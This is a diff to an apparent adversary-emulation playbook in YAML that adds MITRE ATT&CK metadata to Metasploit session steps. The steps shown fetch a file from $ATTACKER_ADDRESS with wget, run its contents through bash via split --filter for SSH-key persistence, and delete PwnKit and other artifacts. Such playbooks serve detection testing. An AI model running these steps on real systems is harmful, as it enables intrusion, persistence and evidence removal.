@@ -64,7 +64,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-      technique_name:"Ingress Tool Transfer"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
@@ -72,7 +72,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-      technique_name:"Ingress Tool Transfer"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     cmd: shell
@@ -179,33 +179,42 @@ commands:
     session: "foothold"
     cmd: "cd /root; wget http://$ATTACKER_ADDRESS/README.txt"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1105,T1098.004"
+      tactics: "Command and Control,Persistence,Privilege Escalation"
+      technique_name:"Ingress Tool Transfer,Account Manipulation: SSH Authorized Keys"
 
   - type: msf-session
     cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
     session: "foothold"
     end_str: "PWN >"
     metadata:
-      techniques: "T1218,T1098"
+      techniques: "T1218,T1098.004"
       tactics: "Defense Evasion,Persistence,Privilege Escalation"
+      technique_name: "System Binary Proxy Execution,Account Manipulation: SSH Authorized Keys"
 
   - type: msf-session
     cmd: rm /opt/README.txt
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1070.004"
+      tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: File Deletion"    
 
   - type: msf-session
     cmd: exit
     session: "foothold"
     end_str: "PWN >"
 
-
   - type: msf-session
     cmd: rm ./PwnKit
     session: "foothold"
     end_str: "PWN >"
     metadata:
-      techniques: "T1070"
+      techniques: "T1070.004"
       tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: File Deletion"
 
 
   - type: msf-session
@@ -213,8 +222,9 @@ commands:
     session: "foothold"
     end_str: "PWN >"
     metadata:
-      techniques: "T1070"
+      techniques: "T1070.004"
       tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: File Deletion"
 
   - type: msf-session
     cmd: exit
